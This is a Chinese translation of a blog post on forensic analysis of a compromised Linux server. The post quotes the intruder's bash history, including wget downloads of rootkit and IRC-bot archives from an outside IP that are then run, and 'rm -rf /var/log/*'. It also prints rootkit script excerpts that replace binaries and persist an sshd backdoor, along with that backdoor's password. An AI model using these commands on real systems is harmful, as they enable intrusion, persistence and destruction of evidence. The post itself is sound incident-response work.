---
layout: post
title: "Holiday cracking 翻译"
description: ""
category: 渗透测试
tags: [linux,rootkit]
---
{% include JB/setup %}


原文:http://blog.larsstrand.no/2007/04/holiday-cracking.html

比较老的文章了.国内几个大牛的博客都见到过转载原文的,貌似没见到有翻译版.

## 翻译 ##

最近有个朋友让我去帮他看一下他的linux服务器.说是apache启动不了,有很多诡异的情况.后来证明绝不是apache启动不了这么简单.

登上服务器之后随便看了下,最先引起我注意的是"ls"命令的输出:

	lars@server1:~$ ls
	ls: invalid option -- h
	Try `ls --help' for more information.

为什么"ls"默认加了"-h"参数呢?我用"alias"命令看了一下,然后取消了这个别名之后"ls"就工作正常了.

	lars@server1:~$ alias ls
	alias ls='ls -sh --color=auto'
	lars@server1:~$ unalias ls
	lars@server1:~$ ls
	backup
	lars@server1:~$

虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题.

	lars@server1:~$ sudo /etc/init.d/apache2 start
	Password:
	 * Starting apache 2.0 web server...
	(2): apache2: could not open error log file /var/log/apache2/error.log.
	Unable to open logs
	 ...fail!

纳尼?赶紧去"/var/log/"目录一看,果然"apache2/"文件夹不见了.而且这个目录下其他的文件夹,比如"mysql/","samba/"也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题.

	lars@server1:~$ sudo -i
	Password:
	root@server1:~# ls
	ls: unrecognized prefix: do
	ls: unparsable value for LS_COLORS environment variable
	total 44
	  4 .                 4 .bashrc           4 .ssh
	  4 ..                4 .lesshst          8 .viminfo
	  8 .bash_history     4 .profile          4 .vimrc

很不幸的发现,"ls"又出问题了.同样,用"alias"命令:

	root@server1:~# alias ls
	alias ls='ls -sa --color=auto'
	root@server1:~# unalias ls
	root@server1:~# ls
	root@server1:~#

这个时候,我才意识到问题的严重性."ls"奇怪的举动和"/var/log/"大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的".bash_history"时,就已经可以确定被入侵了.

	root@server1:~# cat -n .bash_history
	...
	340  w
	341  cd /var
	342  wget http://83.19.148.250/~matys/pliki/shv5.tar.gz
	343  tar -zxf shv5.tar.gz
	344  rm -rf shv5.tar.gz
	345  mv shv5 .x
	346  cd .x
	347  ./setup zibi.joe.149 54098
	348  passwd
	349  passwd
	350  ps aux
	351  crontab -l
	352  cat /etc/issue
	353  cat /etc/passwd
	354  w
	355  who
	356  cd /usr/lib/libsh
	357  ls
	358  hide +
	359  chmod +x hide
	360  hide +
	361  ./hide +
	362  cd /var/.x
	363  mkdir psotnic
	364  cd psotnic
	365  wget http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz
	366  tar -zxf psotnic0.2.5.tar.gz
	367  rm -rf psotnic0.2.5.tar.gz
	368  ls
	369  mv psotnic-0.2.5-linux-static-ipv6 synscan
	370  ./synscan
	371  vi conf
	372  vi conf1
	373  mv synscan smbd
	374  smbd -c conf
	375  ls
	376  ps aux
	377  ls
	378  ./smbd -c conf
	379  ./smbd -c conf1
	380  ./smbd conf
	381  ./smbd conf1
	382  ./smbd -a conf conf1
	383  rm -rf conf.dec
	384  rm -rf conf1.dec
	385  cd /usr/lib/libsh
	386  ./hide +
	387  exit
	...
	425  ssh ftp@62.101.251.166
	426  w
	427  ls
	428  ls
	429  cd /var/.x
	430  ls
	431  cd psotnic/
	432  ls
	433  rm -rf /var/log/*
	434  exit
	435  ls
	436  cd /var/.x/psotnic/
	437  ls
	438  vi conf2
	439  ./smbd -c conf2
	440  ./smbd conf2
	441  ./smbd -a conf conf1 conf2
	442  rm -rf conf2.dec
	443  cd ..
	444  ls
	445  cd /usr/lib/libsh
	446  hide +
	447  ./hide +
	448  exit
	449  ps aux
	450  cd /var/.x
	451  ls
	452  ls
	453  cd psotnic/
	454  ls
	455  cat pid.MastaH
	456  kill -9 2030
	457  ./synscan -a conf conf1
	458  ./smbd -a conf conf1
	459  cd /usr/lib/libsh
	460  ./hide +

Woht!这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除".bash_history"文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵.

通过bash history我们得到了大量的信息.先来看一下"/var/.x"下面隐藏了什么和命令"setup zibi.joe.149 54098"的作用吧.

	root@server1:/var/.x# file setup
	setup: Bourne-Again shell script text executable
	root@server1:/var/.x# wc -l setup
	825 setup
	root@server1:/var/.x# head -17 setup
	#!/bin/bash
	#
	# shv5-internal-release
	# by: PinT[x] April/2003
	# 
	# greetz to:
	#
	# [*] SH-members: BeSo_M, grass^, toolman, nobody, niceboy, armando99 
	#                 C00L|0, GolDenLord, Spike, zion ...
	# [*] Alba-Hack : 2Cool, heka, TheMind, ex-THG members ...
	# [*] SH-friends: mave, AlexTG, Cat|x, klex, JinkS ...
	# [*] tC-members: eksol, termid, hex, keyhook, maher, tripod etc..
	# [*] And all others who diserve to be here but i forgot
	# [*] them at the moment !
	# 
	# PRIVATE ! DO NOT DISTRIBUTE *censored*EZ !

"setup"这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门--"/bin/ttyload",然后把它加到了"/etc/inittab",这样每次重启后就会自动启动.(相关部分的脚本如下:)

	mv $SSHDIR/sshd /sbin/ttyload
	chmod a+xr /sbin/ttyload
	chmod o-w /sbin/ttyload
	touch -acmr /bin/ls /sbin/ttyload
	chattr +isa /sbin/ttyload
	kill -9 `pidof ttyload` >/dev/null 2>&1
	....
	# INITTAB SHUFFLING
	chattr -isa /etc/inittab
	cat /etc/inittab |grep -v ttyload|grep -v getty > /tmp/.init1
	cat /etc/inittab |grep getty > /tmp/.init2
	echo "# Loading standard ttys" >> /tmp/.init1
	echo "0:2345:once:/usr/sbin/ttyload" >> /tmp/.init1

它也替换了一些linux的标准命令.

	# Backdoor ps/top/du/ls/netstat/etc..
	cd $BASEDIR/bin
	BACKUP=/usr/lib/libsh/.backup
	mkdir $BACKUP
	...
	# ls ...
	chattr -isa /bin/ls
	cp /bin/ls $BACKUP
	mv -f ls /bin/ls
	chattr +isa /bin/ls

这样子就可以解释为什么"ls"命令输出那么奇怪了.

".backup"文件夹保存了被替换之前的命令程序.

	root@server1:/var/.x# ls -l /usr/lib/libsh/.backup/
	total 552
	-rwxr-xr-x   1 root     root       126276 Dec 24 22:58 find
	-rwxr-xr-x   1 root     root        59012 Dec 24 22:58 ifconfig
	-rwxr-xr-x   1 root     root        77832 Dec 24 22:58 ls
	-rwxr-xr-x   1 root     root        30388 Dec 24 22:58 md5sum
	-rwxr-xr-x   1 root     root        99456 Dec 24 22:58 netstat
	-rwxr-xr-x   1 root     root        65492 Dec 24 22:58 ps
	-rwxr-xr-x   1 root     root        14016 Dec 24 22:58 pstree
	-rwxr-xr-x   1 root     root        50180 Dec 24 22:58 top


看了一下时间戳,居然是在圣诞节.

很显然,原始的"ls"和后门安装的"ls"是不一样的.他们的md5对比如下:

	root@server1:~# md5sum /usr/lib/libsh/.backup/ls /bin/ls
	eef7ca9dd6be1cc53bac84012f8d1675  /usr/lib/libsh/.backup/ls
	0a07cf554c1a74ad974416f60916b78d  /bin/ls

	root@server1:~# file /bin/ls
	/bin/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, dynamically linked 
	(uses shared libs), for GNU/Linux 2.0.0, stripped

	root@server1:~# file /usr/lib/libsh/.backup/ls
	/usr/lib/libsh/.backup/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.0, dynamically linked 
	(uses shared libs), for GNU/Linux 2.6.0, stripped

这个rootkit("sh5.tar.gz")是从下面的地址下载的.

	root@server1:~# dig +short -x 83.19.148.250
	4lo.bydg.pl.

这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.

这是运行"setup"命令的截图:(在服务器上的沙盒里运行的)

![output](http://3.bp.blogspot.com/_iX_rBDYcMHQ/TMtDG_j_l0I/AAAAAAAABBc/kWxNZJY7TXI/s1600/HollidayCracking_1_original.jpg)

所以"zibi.joe.149"是后门的密码,"54098"是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下:

![backdoor](http://4.bp.blogspot.com/_iX_rBDYcMHQ/TMtDPb4GN3I/AAAAAAAABBg/rhaPBk_muqU/s1600/HollidayCracking_2_original.jpg)

安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员."psotnic0.2.5.tar.gz"就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为"smbd",来达到隐藏的目的.

然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了.

	371  vi conf
	372  vi conf1
	....
	378  ./smbd -c conf 
	379  ./smbd -c conf1
	380  ./smbd conf
	381  ./smbd conf1
	382  ./smbd -a conf conf1

让我们执行一下382这条命令,看看会发生什么.

	root@server1:/var/.x/psotnic# ./smbd -a conf conf1

	Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49)
	Copyright (C) 2003-2005 Grzegorz Rusin 

	[+] Adding: */10 * * * * cd /var/.x/psotnic; ./smbd conf >/dev/null 2>&1
	[+] Adding: */10 * * * * cd /var/.x/psotnic; ./smbd conf1 >/dev/null 2>&1
	[+] Added 2 psotnics to cron

哇!它添加了cron定时任务.赶紧看一看:

	root@server1:/var/.x/psotnic# crontab -l
	*/10 * * * * cd /var/.x/psotnic; ./smbd conf >/dev/null 2>&1
	*/10 * * * * cd /var/.x/psotnic; ./smbd conf1 >/dev/null 2>&1

接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程:

	root@server1:~# cd /var/.x/psotnic; ./smbd conf

	Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49)
	Copyright (C) 2003-2005 Grzegorz Rusin 

	[*] Acting as LEAF
	[+] Config loaded
	[+] Going into background [pid: 5724]
	root@server1:/var/.x/psotnic# ./smbd conf1

	Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49)
	Copyright (C) 2003-2005 Grzegorz Rusin 

	[*] Acting as LEAF
	[+] Config loaded
	[+] Going into background [pid: 5727]
	root@server1:/var/.x/psotnic# 


用"ps"命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程.

	root@server1:/var/.x/psotnic# ps axuw | grep smb
	root      3799  0.0  0.4  8592 2156 ?        S    11:00   0:00 /usr/sbin/smbd -D
	root      3808  0.0  0.1  8592  896 ?        S    11:00   0:00 /usr/sbin/smbd -D
	root      5724  0.0  0.1  1648  772 pts/2    S    12:47   0:00 ./smbd conf
	root      5727  0.0  0.1  1640  764 pts/2    S    12:47   0:00 ./smbd conf1


最开始两个是真正的samba进程,后面两个是irc-bot,让我们用"strace"命令来看看它做了什么:

	root@server1:~# strace -p 5727
	...
	connect(3, {sa_family=AF_INET, sin_port=htons(9714), sin_addr=inet_addr("83.18.74.235")}, 16) = -1 EINPROGRESS (Operation now in progress)
	...
	connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr("195.159.0.92")}, 16) = -1 EINPROGRESS (Operation now in progress)

可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口:

	root@server1:~# dig +short -x 83.18.74.235
	manhattan.na.pl.
	root@server1:~# dig +short -x 195.159.0.92
	ircnet.irc.powertech.no.

又是一个波兰的ip.另外一个ip,"ircnet.irc.powertech.no"是"irc.powertech.nof"的别名.是挪威一个著名的irc服务器.

tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了"irc.powertech.no",加入了"#aik"频道.

	:irc.powertech.no 001 578PAB9NB :Welcome to the Internet Relay Network 578PAB9NB!~op@ti231210a080-3666.bb.online.no
	:irc.powertech.no 002 578PAB9NB :Your host is irc.powertech.no, running version 2.11.1p1

	:578PAB9NB!~op@ti231210a080-3666.bb.online.no JOIN :#aik
	:irc.powertech.no 353 578PAB9NB @ #aik :578PAB9NB kknd raider brandyz jpi conf xerkoz IpaL vvo 
	:irc.powertech.no 366 578PAB9NB #aik :End of NAMES list.
	:irc.powertech.no 352 578PAB9NB #aik ~op ti231210a080-3666.bb.online.no irc.powertech.no 578PAB9NB G :0 op - GTW
	:irc.powertech.no 352 578PAB9NB #aik ~kknd ti231210a080-3666.bb.online.no irc.hitos.no kknd H :2 kknd - GTW
	:irc.powertech.no 352 578PAB9NB #aik ~raider mobitech-70.max-bc.spb.ru *.dotsrc.org raider G :4 raider - GTW
	:irc.powertech.no 352 578PAB9NB #aik ~brandyz mobitech-70.max-bc.spb.ru *.dotsrc.org brandyz G :4 brandyz - GTW
	:irc.powertech.no 352 578PAB9NB #aik ~jpi p3124-ipad309sasajima.aichi.ocn.ne.jp *.jp jpi G :8 jpi - GTW
	:irc.powertech.no 352 578PAB9NB #aik ~conf p3124-ipad309sasajima.aichi.ocn.ne.jp *.jp conf G :7 conf - GTW
	:irc.powertech.no 352 578PAB9NB #aik ~xerkoz p3124-ipad309sasajima.aichi.ocn.ne.jp *.jp xerkoz H :7 xerkoz - GTW
	:irc.powertech.no 352 578PAB9NB #aik lm campus19.panorama.sth.ac.at *.at IpaL H :5 .LaPi.9@.IRCNet..
	:irc.powertech.no 352 578PAB9NB #aik ~vvo ppp86-7.intelcom.sm *.tiscali.it vvo H :6 vvo - GTW
	:irc.powertech.no 315 578PAB9NB #aik :End of WHO list.

这些仅仅是加入#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了.这个入侵者又要郁闷了.

	17:43 -!- viper42 [~viper42@trinity.gnist.org] has joined #aik
	17:43 [Users #aik]
	17:43 [ 578PAB9NL] [ conf] [ jpi ] [ raider ] [ vvo   ] 
	17:43 [ brandyz  ] [ IpaL] [ kknd] [ viper42] [ xerkoz] 
	17:43 -!- Irssi: #aik: Total of 10 nicks [0 ops, 0 halfops, 0 voices, 10 normal]
	17:43 -!- Irssi: Join to #aik was synced in 1 secs

我发现我朋友的服务器使用的昵称是"578PQB9NB",还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀"\*-GTW",只有一个没有:

	17:45 [powertech] -!- IpaL [lm@campus19.panorama.sth.ac.at]
	17:45 [powertech] -!-  ircname  : LaPi@IRCNet
	17:45 [powertech] -!-  channels : #relaks #ping @#seks #aik @#ogame.pl 
    #pingwinaria #hattrick #trade #admin @#!sh 
	17:45 [powertech] -!-  server   : *.at [\o\  \o/  /o/]

这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了:

	$ dig +short campus19.panorama.sth.ac.at
	193.170.51.84

根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:

	From: Alexander Talos via RT
	To: larstra@ifi.uio.no
	Subject: Cracker at campus19.panorama.sth.ac.at (193.170.51.84)  [ACOnet CERT #38603]
	Date: Fri, 18 May 2007 18:22:43 +0200 (CEST)
	Reply-To: cert@aco.net

	-----BEGIN PGP SIGNED MESSAGE----- 
	Hash: SHA1

	Hej!

	On Fri May 18 14:45:03 2007, larstra@ifi.uio.no wrote:

	> I have been tracking down cracker which connected from
	> campus19.panorama.sth.ac.at (193.170.51.84). The user, which

	Ouch. panorama.sth.ac.at is a dormitory with about 4k rooms all
	behind a NAT gateway - it will be very hard to get hold of the
	miscreant.

	This incident will, in the long run, definitely help me getting
	rid of the NAT boxes in setups like that, but right now, we will 
	have to make do with what we have.

	> Please investigate the host in question. Perhaps is this a
	> compromised host on your network acting as a jumpstation for

	Sure, and even in a NATed environment, this is still possible.

	Btw, you did a great job in analysing the compromised machine!

	I'll let you know when I have either further questions or any
	interesting results.

	Cheers,

	Alexander Talos

	- --
	IT-Security, Universitaet Wien, ACOnet CERT

	T: +43-1-4277-14351  M: +43-664-60277-14351


看起来我不够幸运.

接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口.

连接到"83.18.74.235"的流量看起来很混乱.只好再次用strace命令:

	root@server1:/var/.x/psotnic# strace -f ./smbd conf1 &> /root/dump.strace

跟预期的一样,有很多输出,其中一个是它尝试启动"BitchX",这是一个irc客户端.但是失败了,因为BitchX没有安装:

	[pid  7537] write(2, "sh: ", 4)         = 4
	[pid  7537] write(2, "BitchX: not found", 17) = 17
	[pid  7537] write(2, "n", 1)           = 1
	[pid  7537] close(2)                    = 0

下面的截图是tcpdump抓到流量的一部分:

![tcpdump](http://3.bp.blogspot.com/_iX_rBDYcMHQ/TMtFwuLEMOI/AAAAAAAABBk/N6nFQp_Po_Y/s1600/HollidayCracking_3_original.jpg)

这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是"irc.hitos.no",位于挪威的特罗姆斯郡.

入侵者除了这些,还运行了一个叫"hide"的脚本来清除日志:

	root@server1:/usr/lib/libsh# ./hide +
    Linux Hider v2.0 by mave
    enhanced by me!
	[+] [Shkupi Logcleaner] Removing + from the logs........ .

	[+] /var/log/messages  ... [done]

	[+] /var/run/utmp      ... [done]

	[+] /var/log/lastlog   ... [done]

	[+] /var/log/wtmp      ... [done]

    * m i s s i o n  a c c o m p l i s h e d *

    p.h.e.e.r  S.H.c.r.e.w

那么这个入侵者为什么还要把"/var/log/"目录全删除了呢,是不相信这个工具么?还是他特别害怕?

可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到:

1, 忘记清除".bash_history"文件

2, "/var/log"目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.

3, 修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.

4, irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.

5, 入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.

当然还有几个遗留的问题:

1,"ssh ftp@62.101.251.166" 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?

      $ dig +short -x 62.101.251.166
      cA6FB653E.dhcp.bluecom.no.

2,跟83.18.74.235(manhattan.na.pl)的通讯内容是什么?

3,最重要的问题是他一开始是如何或得下系统的权限的?这个服务器运行的是Ubuntu 6.06 LTS,打了最新的补丁.可能入侵的途径:

*猜测root密码,不幸的是这个密码是强密码*

*未知的exploit*

*某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码.*




